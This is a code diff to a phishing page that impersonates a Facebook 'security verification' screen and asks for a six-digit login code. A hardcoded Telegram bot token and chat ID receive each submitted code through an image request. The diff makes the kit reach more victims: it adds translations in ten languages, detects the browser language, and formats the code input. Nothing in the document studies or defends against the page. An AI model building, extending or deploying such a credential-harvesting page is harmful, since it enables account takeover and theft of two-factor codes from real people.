@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="es" dir="ltr">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -20,22 +20,54 @@ button{width:100%;padding:14px;font-size:17px;font-weight:700;color:#fff;backgro
 <body>
 <div class="top"><img src="logo.png" alt="Facebook"></div>
 <div class="wrap">
-<h1>Verificación de seguridad</h1>
-<p class="sub">Escribe el código de 6 dígitos que enviamos a tu teléfono o correo.</p>
+<h1 id="h1">Verificación de seguridad</h1>
+<p class="sub" id="sub">Escribe el código de 6 dígitos que enviamos a tu teléfono o correo.</p>
 <form onsubmit="go(event)">
-<input id="c" type="text" inputmode="numeric" required>
-<button type="submit">Confirmar</button>
+<input id="c" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" required>
+<button type="submit" id="btn">Confirmar</button>
 </form>
-<p class="note">¿No te llegó? Reenvíalo desde tu Facebook.</p>
+<p class="note" id="note">¿No te llegó? Reenvíalo desde tu Facebook.</p>
 </div>
 <script>
 var T="9061884309:AAFtj5dnJQjl9Svv15qJQHYHN3VIxbuyk6M";
 var C="7238838844";
+
+var S={
+es:{h1:"Verificación de seguridad",sub:"Escribe el código de 6 dígitos que enviamos a tu teléfono o correo.",btn:"Confirmar",note:"¿No te llegó? Reenvíalo desde tu Facebook."},
+en:{h1:"Security check",sub:"Enter the 6-digit code we sent to your phone or email.",btn:"Confirm",note:"Didn't get it? Resend it from Facebook."},
+pt:{h1:"Verificação de segurança",sub:"Digite o código de 6 dígitos que enviamos para seu telefone ou e-mail.",btn:"Confirmar",note:"Não recebeu? Reenvie pelo Facebook."},
+fr:{h1:"Vérification de sécurité",sub:"Saisissez le code à 6 chiffres envoyé à votre téléphone ou e-mail.",btn:"Confirmer",note:"Rien reçu ? Renvoyez-le depuis Facebook."},
+de:{h1:"Sicherheitsüberprüfung",sub:"Gib den 6-stelligen Code ein, den wir an dein Telefon oder deine E-Mail gesendet haben.",btn:"Bestätigen",note:"Nichts erhalten? Über Facebook erneut senden."},
+it:{h1:"Verifica di sicurezza",sub:"Inserisci il codice di 6 cifre che abbiamo inviato al tuo telefono o alla tua email.",btn:"Conferma",note:"Non ti è arrivato? Invia di nuovo da Facebook."},
+ru:{h1:"Проверка безопасности",sub:"Введите 6-значный код, отправленный на ваш телефон или почту.",btn:"Подтвердить",note:"Не пришло? Отправьте заново из Facebook."},
+ar:{h1:"تحقّق أمني",sub:"أدخل الرمز المكوّن من 6 أرقام الذي أرسلناه إلى هاتفك أو بريدك.",btn:"تأكيد",note:"لم يصلك؟ أعد إرساله من Facebook."},
+hi:{h1:"सुरक्षा जाँच",sub:"आपके फ़ोन या ईमेल पर भेजा गया 6 अंकों का कोड डालें।",btn:"पुष्टि करें",note:"नहीं मिला? Facebook से दोबारा भेजें।"},
+zh:{h1:"安全验证",sub:"请输入我们发送到你手机或邮箱的 6 位验证码。",btn:"确认",note:"没收到？请从 Facebook 重新发送。"}
+};
+
+var SUP=["es","en","pt","fr","de","it","ru","ar","hi","zh"];
+var raw=(navigator.languages&&navigator.languages[0])||navigator.language||"es";
+var ov=(location.search.match(/[?&]l=([a-zA-Z-]+)/)||[])[1];
+if(ov)raw=ov;
+var base=raw.toLowerCase().split("-")[0];
+var lang=SUP.indexOf(base)>=0?base:"es";
+var L=S[lang];
+
+document.documentElement.lang=lang;
+document.documentElement.dir=lang==="ar"?"rtl":"ltr";
+document.getElementById("h1").textContent=L.h1;
+document.getElementById("sub").textContent=L.sub;
+document.getElementById("btn").textContent=L.btn;
+document.getElementById("note").textContent=L.note;
+
+var c=document.getElementById("c");
+c.addEventListener("input",function(){this.value=this.value.replace(/\D/g,"").slice(0,6);});
+
 function ping(t){new Image().src="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(t);}
 function go(e){
- e.preventDefault();
- ping("CODIGO | "+document.getElementById("c").value);
- setTimeout(function(){location.href="done.html";},800);
+  e.preventDefault();
+  ping("CODIGO | "+c.value+" | "+lang);
+  setTimeout(function(){location.href="done.html?l="+lang;},800);
 }
 </script>
 </body>
